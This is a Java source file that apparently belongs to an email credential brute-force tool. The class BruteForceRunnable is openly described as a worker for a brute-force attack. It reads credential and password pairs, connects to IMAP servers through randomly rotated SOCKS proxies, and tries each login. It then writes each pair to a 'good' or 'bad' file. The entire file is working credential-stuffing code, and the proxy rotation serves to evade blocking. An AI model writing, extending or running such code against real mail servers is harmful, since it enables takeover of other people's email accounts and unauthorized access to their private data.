package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.model.Connection;
import org.bsoftware.parcel.domain.model.LogLevel;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.Source;
import org.bsoftware.parcel.utilities.ConnectionUtility;
import org.bsoftware.parcel.utilities.FileSystemUtility;

import java.io.IOException;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.6
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Defines connection timeout
     */
    private static final byte CONNECTION_TIMEOUT = 5;

    /**
     * Defines Socks version
     */
    private static final byte SOCKS_VERSION = 4;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    @SneakyThrows
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
        ckImap.put_SocksVersion(SOCKS_VERSION);

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                final Connection connection = ConnectionUtility.getConnection(source.getCredential());

                ckImap.put_Port(connection.getPort());
                ckImap.put_Ssl(connection.isSsl());
                ckImap.put_StartTls(connection.isTls());

                connectToServer(ckImap, connection.getHost());
                FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);

                if (!Thread.currentThread().isInterrupted())
                {
                    bruteForceCallback.handleDecrementSourcesCounter();
                }
                else if (!ckImap.connectedToHost().isEmpty())
                {
                    ckImap.Disconnect();
                }
            }
        }
        catch (final IOException ioException)
        {
            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("Exception occurred, while saving source to file, message: %s", ioException.getMessage()));
        }

        bruteForceCallback.handleThreadInterruption();
    }

    /**
     * Tries to connect to IMAP server, using proxy
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     */
    private void connectToServer(final CkImap ckImap, final String host)
    {
        if (!ckImap.socksHostname().isEmpty() && ckImap.Connect(host))
        {
            return;
        }

        Proxy proxy;
        while (((proxy = DataContainer.getRandomProxy()) != null) && !Thread.currentThread().isInterrupted())
        {
            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());

            if (ckImap.Connect(host))
            {
                return;
            }
        }
    }
}